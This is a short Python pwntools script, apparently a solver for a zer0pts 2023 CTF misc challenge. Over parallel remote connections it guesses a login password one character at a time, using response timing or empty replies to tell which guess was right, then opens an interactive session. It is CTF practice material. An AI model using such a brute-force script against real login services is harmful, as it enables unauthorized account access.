from pwn import *
from functools import partial
from multiprocessing import Pool
import time

# io = remote("misc.2023.zer0pts.com", "10022")
# io.send(b"a")
# io.send(b"d")
# io.send(b"m")
# io.send(b"i")
# io.send(b"n")
# io.send(b"n")
# io.send(b"\n")
# io.interactive()


def check(password, c):
    io = remote("misc.2023.zer0pts.com", "10022")
    io.sendline(b"guest")

    # 正しいと分かっている
    for p in password:
        io.send(p.encode())

    # 計測開始
    io.recvuntil(b"Password:")
    start = time.time()

    # predict
    time.sleep(2)
    print(f"predict: {password} + {c} + $")
    io.send(c.encode())
    io.send(b"$")

    # sleep分だけ遅ければ正しかったということ
    msg = io.recvline(timeout=10)
    duration = time.time() - start
    print(msg)
    print(f"{duration=}")
    if b"Incorrect" in msg:
        pass
    elif len(msg) == 0:
        password += c
    elif b"Logged in" in msg:
        print(f"OK: {password}")
        io.interactive()
    io.close()
    return duration, c


if __name__ == "__main__":
    password = ""
    pool = Pool(processes=4)
    # T = pool.map(partial(check, password), "0123456789abcdef")
    password = "gues"
    T = pool.map(partial(check, password), "56789abcdefguest")
    print(T)
